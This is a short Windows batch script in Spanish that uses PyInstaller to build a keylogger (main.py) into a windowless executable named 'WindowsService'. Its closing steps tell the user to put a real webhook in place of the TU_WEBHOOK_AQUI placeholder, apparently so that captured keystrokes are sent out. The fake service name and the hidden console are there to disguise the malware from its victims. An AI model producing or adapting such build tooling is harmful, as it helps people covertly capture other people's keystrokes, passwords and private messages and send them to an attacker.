@echo off
echo Compilando Keylogger a ejecutable...
echo.

REM Verificar si PyInstaller está instalado
pip show pyinstaller >nul 2>&1
if errorlevel 1 (
    echo Instalando PyInstaller...
    pip install pyinstaller
)

echo.
echo Compilando main.py a ejecutable...
pyinstaller --onefile --noconsole --name "WindowsService" main.py

if errorlevel 1 (
    echo ERROR: Error al compilar.
    pause
    exit /b 1
)

echo.
echo ✅ Compilación completada!
echo 📁 El ejecutable está en: dist\WindowsService.exe
echo.
echo 🚀 Para usar:
echo 1. Reemplaza TU_WEBHOOK_AQUI en main.py con tu webhook real
echo 2. Ejecuta build.bat nuevamente
echo 3. El ejecutable estará listo en dist\WindowsService.exe
echo.
pause 